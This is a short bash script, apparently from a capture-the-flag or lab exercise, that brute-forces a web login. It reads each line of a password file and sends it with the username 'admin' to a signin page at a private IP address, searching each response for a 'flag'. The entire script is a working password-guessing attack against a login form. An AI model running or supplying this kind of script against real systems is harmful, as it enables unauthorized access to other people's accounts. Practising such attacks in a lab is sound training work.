#!/bin/bash

IP="192.168.56.101"

while IFS= read -r line; do
	printf 'test with user[admin]:passwd:[%s]\n' "$line"
	curl "http://$IP/?page=signin&username=admin&password=$line&Login=Login" | grep "flag"
	# echo 
done < "./passwd_list.txt"